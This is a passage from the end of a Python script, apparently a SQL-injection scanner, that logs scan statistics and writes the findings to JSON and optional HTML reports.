    log(f"Scan finished in {elapsed:.2f}s. Findings(unique): {len(all_findings)} | Verified: {summary.get('verified',0)}")
    log(f"Pages affected: {len(pages)}")

    # -------------------------
    # JSON Report (with summary + pages)
    # -------------------------
    try:
        with open(REPORT_JSON, "w", encoding="utf-8") as jf:
            _json.dump({
                "generated_at": now_ts(),
                "targets_scanned": len(targets),
                "elapsed_sec": round(elapsed, 3),
                "findings_count": len(all_findings),
                "summary": summary,
                "pages": pages,
                "findings": all_findings
            }, jf, indent=2, ensure_ascii=False)
        log(f"Structured JSON report saved to {REPORT_JSON}")
    except Exception as e:
        log(f"[ERROR] Could not write JSON report: {e}")

    if REPORT_HTML_ENABLED:
        generate_sqli_html_report(all_findings, output_file=REPORT_HTML_FILE)

    if REPORT_ALL_HTML_ENABLED:
        generate_full_html_report(all_findings, output_file=REPORT_ALL_HTML_FILE)


if __name__ == "__main__":
    main()

